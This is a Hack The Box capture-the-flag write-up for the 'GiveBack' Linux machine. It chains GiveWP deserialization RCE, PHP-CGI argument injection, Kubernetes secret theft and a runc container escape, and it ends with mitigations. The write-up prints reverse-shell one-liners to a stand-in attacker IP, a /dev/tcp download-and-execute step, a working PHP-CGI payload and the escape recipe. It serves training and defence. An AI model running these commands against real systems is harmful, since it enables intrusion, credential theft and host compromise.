# GiveBack — Hack The Box Writeup

**Author:** k1ph4ru  
**Difficulty:** Medium  
**OS:** Linux  
**Date:** February 2026

---

## Table of Contents

1. [Synopsis](#synopsis)
2. [Skills Required](#skills-required)
3. [Skills Learned](#skills-learned)
4. [Enumeration](#enumeration)
5. [Foothold — CVE-2024-5932](#foothold--cve-2024-5932)
6. [Pivoting — Chisel Tunnel](#pivoting--chisel-tunnel)
7. [Lateral Movement — CVE-2024-4577](#lateral-movement--cve-2024-4577)
8. [Privilege Escalation — CVE-2024-21626](#privilege-escalation--cve-2024-21626)
9. [Vulnerability Discussion & Mitigations](#vulnerability-discussion--mitigations)

---

## Synopsis

GiveBack is a medium-difficulty Linux machine that chains four distinct vulnerabilities across a Kubernetes-managed containerized environment. The attack path begins with an unauthenticated PHP Object Injection flaw in the GiveWP WordPress plugin (CVE-2024-5932), which yields remote code execution inside a container. Internal service discovery via environment variables leads to a second container running a legacy PHP-CGI handler vulnerable to argument injection (CVE-2024-4577). Exploiting this second container as root exposes Kubernetes service account secrets, enabling SSH access to the underlying host. Finally, a vulnerable `runc` debug wrapper (CVE-2024-21626) is abused to escape container isolation and achieve full root access on the host.

---

## Skills Required

- Web application and WordPress enumeration
- Familiarity with PHP deserialization concepts
- Network pivoting and port forwarding
- Basic Kubernetes concepts and API interaction
- Understanding of container runtimes (runc / OCI)

---

## Skills Learned

- Exploiting PHP Object Injection via deserialization (CVE-2024-5932)
- PHP-CGI argument injection exploitation (CVE-2024-4577)
- Using Chisel for reverse port forwarding in restricted environments
- Enumerating Kubernetes secrets from within a pod
- Exploiting a container escape via runc file descriptor leak (CVE-2024-21626)

---

## Enumeration

### Port Scan

An initial full-port Nmap scan identifies the following open services:

```
PORT      STATE    SERVICE    VERSION
22/tcp    open     ssh        OpenSSH 8.9p1 Ubuntu
80/tcp    open     http       nginx 1.28.0
6443/tcp  filtered sun-sr-https
10250/tcp filtered unknown
30686/tcp open     http       Golang net/http server
```

Port 80 serves a WordPress site titled **GIVING BACK IS WHAT MATTERS MOST**, with `robots.txt` disallowing `/wp-admin/`. Port 30686 returns a JSON payload identifying a Kubernetes load balancing endpoint (`wp-nginx-service`). Ports 6443 and 10250 are filtered — consistent with a Kubernetes control plane.

### WordPress Enumeration

Running WPScan against the target reveals the **GiveWP** donation plugin at version **3.14.0**, which is significantly outdated:

```bash
wpscan --url http://giveback.htb/
```

```
[+] give
   | Version: 3.14.0 (100% confidence)
   | [!] The version is out of date, the latest version is 4.4.0
```

Querying the WordPress REST API exposes a valid username:

```bash
curl -s http://giveback.htb/wp-json/wp/v2/users | jq
```

This returns the user `babywyrm`, which will be relevant later during post-exploitation.

The donation form is accessible at `/donations/the-things-we-need/` — the attack surface for initial exploitation.

---

## Foothold — CVE-2024-5932

### Vulnerability Overview

CVE-2024-5932 is an **unauthenticated PHP Object Injection** vulnerability in GiveWP versions up to and including 3.14.1. User-controlled input passed through the `give_title` POST parameter is deserialized without sanitization. Combined with a pre-existing POP (Property-Oriented Programming) chain within the plugin's codebase, this allows an unauthenticated attacker to achieve arbitrary remote code execution.

### Exploitation

A publicly available PoC was used to exploit the vulnerability in two stages. First, a reverse shell payload is written to the `/tmp` directory on the target:

```bash
python3 CVE-2024-5932-rce.py \
  -u http://giveback.htb/donations/the-things-we-need/ \
  -c "echo '/usr/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/4455 0>&1' > /tmp/code"
```

A Netcat listener is set up to receive the connection:

```bash
nc -lnvp 4455
```

The payload is then executed:

```bash
python3 CVE-2024-5932-rce.py \
  -u http://giveback.htb/donations/the-things-we-need/ \
  -c "/usr/bin/bash /tmp/code"
```

A reverse shell is received, confirming initial access inside the WordPress container:

```
uid=1001 gid=0(root) groups=0(root),1001
```

---

## Pivoting — Chisel Tunnel

### Internal Service Discovery

Inspecting the container's environment variables reveals an internal service:

```bash
env | grep -i legacy
```

```
LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000
LEGACY_INTRANET_SERVICE_SERVICE_HOST=10.43.2.241
```

This service is not directly reachable from the attacker machine, so a tunnel is established using **Chisel**.

### Setting Up the Tunnel

On the attacker machine, the Chisel binary is served via a Python HTTP server and a reverse tunnel server is started:

```bash
# Attacker — serve binary
python3 -m http.server 8000

# Attacker — start reverse tunnel server
./chisel server -p 666 --reverse
```

On the target container, Chisel is downloaded using `/dev/tcp` (since `wget` and `curl` were not available) and executed to forward the internal service:

```bash
# Target container — download Chisel
(exec 3<>/dev/tcp/<ATTACKER_IP>/8000; \
  echo -e "GET /chisel HTTP/1.1\r\nHost: <ATTACKER_IP>\r\nConnection: close\r\n\r\n" >&3; \
  cat <&3 | sed '1,/^\r$/d' > /tmp/chisel; chmod +x /tmp/chisel)

# Target container — connect tunnel
/tmp/chisel client <ATTACKER_IP>:666 R:222:10.43.2.241:5000
```

The internal service at `10.43.2.241:5000` is now accessible locally at `http://localhost:222`, where a **GiveBack LLC Internal CMS** page is exposed.

---

## Lateral Movement — CVE-2024-4577

### Vulnerability Overview

The internal CMS page contains a developer note disclosing that the system was originally deployed on Windows IIS using `php-cgi.exe`, and that Windows-style CGI handling was retained during migration to Linux. This hints at **CVE-2024-4577**, a PHP-CGI argument injection vulnerability affecting PHP versions below specific patch levels.

The vulnerability stems from improper handling of certain Unicode characters in URL parameters, allowing an attacker to inject PHP-CGI arguments and achieve arbitrary code execution. PHP version `8.3.3` is confirmed via `/phpinfo.php`, which is in the affected range.

### Exploitation

RCE is confirmed as root with:

```bash
curl -i -X POST \
  "http://localhost:222/cgi-bin/php-cgi?%ADd+auto_prepend_file=php%3A%2F%2Finput" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary "id"
```

```
[START]uid=0(root) gid=0(root) groups=0(root),...[END]
```

A reverse shell is obtained using a FIFO pipe:

```bash
curl -i -X POST \
  "http://localhost:222/cgi-bin/php-cgi?%ADd+auto_prepend_file=php%3A%2F%2Finput" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> 4433 > /tmp/f"
```

### Kubernetes Secret Extraction

With root access inside the second container, the Kubernetes service account token and namespace are available at the standard mount path:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
```

The Kubernetes API is queried to enumerate secrets in the current namespace:

```bash
curl -sSk -H "Authorization: Bearer $TOKEN" \
  "https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/secrets"
```

Two secrets of interest are found: `beta-vino-wp-mariadb` (containing MariaDB credentials) and `user-secret-babywyrm` (containing a `MASTERPASS` field). Decoding the base64-encoded `MASTERPASS` value yields valid SSH credentials for the user `babywyrm`.

```bash
ssh babywyrm@<TARGET_IP>
```

The **user flag** is retrieved at `/home/babywyrm/user.txt`.

---

## Privilege Escalation — CVE-2024-21626

### Enumeration

Checking sudo privileges for `babywyrm`:

```bash
sudo -l
```

```
(ALL) NOPASSWD: !ALL
(ALL) /opt/debug
```

The user may run `/opt/debug` with sudo privileges. Running it with `--version` reveals it is a **restricted runc debug wrapper** using runc version `1.1.11`.

The administrative password required by the wrapper is the MariaDB password obtained from the Kubernetes secrets (also Base64-encoded in the API response).

### Vulnerability Overview

CVE-2024-21626 is a **container escape vulnerability** in runc versions prior to 1.1.12. It is caused by an internal file descriptor leak: runc fails to close a file descriptor pointing to the host filesystem before the container process is started. By setting the container's working directory (`cwd`) to `/proc/self/fd/7`, the container process's current directory is mapped directly into the host filesystem, breaking container isolation.

### Exploitation

An Alpine Linux minimal root filesystem is downloaded and transferred to the target:

```bash
# Attacker — download Alpine rootfs
wget https://dl-cdn.alpinelinux.org/alpine/v3.19/releases/x86_64/alpine-minirootfs-3.19.0-x86_64.tar.gz -O alpine.tar

# Target — download and extract
wget http://<ATTACKER_IP>:8000/alpine.tar -O /tmp/alpine.tar
mkdir -p /tmp/data/rootfs && cd /tmp/data
tar -xf /tmp/alpine.tar -C rootfs/
```

A default runc bundle configuration is generated using the debug wrapper:

```bash
sudo /opt/debug spec
```

The bundle is copied to a user-writable directory and the `cwd` field in `config.json` is modified to trigger the exploit:

```bash
mkdir /tmp/data/conc && cp -a /tmp/data/config.json /tmp/data/rootfs /tmp/data/conc/
cd /tmp/data/conc
perl -i -pe 's/"cwd": "\/",/"cwd": "\/proc\/self\/fd\/7",/' config.json
```

The container is run using the debug wrapper:

```bash
sudo /opt/debug --log ./log.json run runc_exp
```

A shell is obtained inside the container, with the current working directory pointing into the host filesystem. Traversing upward reaches the host root:

```bash
cat ../../../../../root/root.txt
```

The **root flag** is retrieved, completing the machine.

---

## Vulnerability Discussion & Mitigations

### CVE-2024-5932 — GiveWP PHP Object Injection

**Description:** Insecure deserialization of the `give_title` POST parameter in the GiveWP WordPress plugin allows unauthenticated attackers to inject PHP objects. The presence of a usable POP chain within the codebase escalates this to unauthenticated RCE.

**Root Cause:** The plugin passes user-supplied input directly to PHP's `unserialize()` function without validation. This is a well-known class of vulnerabilities in PHP applications.

**Mitigations:**
- Update GiveWP to version 3.14.2 or later, which patches this vulnerability.
- Apply a Web Application Firewall (WAF) rule to block serialized PHP objects in POST parameters.
- As a general principle, avoid using `unserialize()` on user-controlled data. Prefer safer data exchange formats such as JSON with schema validation.
- Regularly audit WordPress plugins and enforce an update policy.

---

### CVE-2024-4577 — PHP-CGI Argument Injection

**Description:** A flaw in PHP's CGI mode allows an attacker to inject PHP-CGI arguments via crafted URL parameters. On affected systems, Unicode best-fit character mapping causes certain characters to be interpreted as PHP-CGI flags, enabling arbitrary code execution.

**Root Cause:** The vulnerability exists because PHP-CGI on certain configurations does not properly sanitize URL parameters before passing them to the underlying CGI handler. The retention of a Windows-style CGI configuration on a Linux system compounded the exposure.

**Mitigations:**
- Upgrade PHP to a patched version (8.1.29+, 8.2.20+, 8.3.8+).
- Avoid deploying PHP in CGI mode (`php-cgi`). Use PHP-FPM or mod_php instead, which are not affected by this class of vulnerability.
- Never carry over Windows-specific server configurations to Linux environments without security review.
- Restrict access to `/cgi-bin/` paths at the web server level.

---

### Kubernetes Secret Exposure

**Description:** Kubernetes automatically mounts service account tokens and namespace information into every pod. With root access inside the container, an attacker can use these credentials to query the Kubernetes API and enumerate secrets across the namespace — including credentials for other services and users.

**Root Cause:** The service account had overly permissive RBAC (Role-Based Access Control) bindings, allowing it to read `Secret` objects. Additionally, sensitive credentials (SSH passwords) were stored as plain Kubernetes Secrets, which are only base64-encoded, not encrypted by default.

**Mitigations:**
- Apply the **Principle of Least Privilege** to Kubernetes service accounts. Pods should only have the permissions they explicitly require.
- Enable **Kubernetes Secret encryption at rest** using an `EncryptionConfiguration` manifest.
- Consider using a dedicated secrets management solution such as HashiCorp Vault or AWS Secrets Manager, with dynamic secret generation.
- Disable automatic service account token mounting on pods that do not require Kubernetes API access (`automountServiceAccountToken: false`).
- Monitor and alert on unexpected Kubernetes API calls from within pods.

---

### CVE-2024-21626 — runc Container Escape

**Description:** A file descriptor leak in runc versions prior to 1.1.12 allows a container process to gain access to the host filesystem by setting its working directory to `/proc/self/fd/7`, which references an open file descriptor pointing to a host directory before it is properly closed.

**Root Cause:** runc did not close all internal file descriptors before executing the container entrypoint. This is a fundamental issue in the lifecycle management of the container runtime.

**Mitigations:**
- Upgrade runc to version 1.1.12 or later.
- Apply the principle of least privilege for sudo access. Avoid granting users access to container runtime wrappers with sudo unless strictly necessary.
- Require strong, unique administrative passwords for privileged tooling and avoid reusing database credentials for system-level authentication.
- Use container security profiles (seccomp, AppArmor, SELinux) to restrict what processes within containers can access.
- Audit the host regularly for writable sudo binaries that wrap low-level container runtimes.

---

*This document was prepared for educational purposes as part of the Hack The Box platform.*
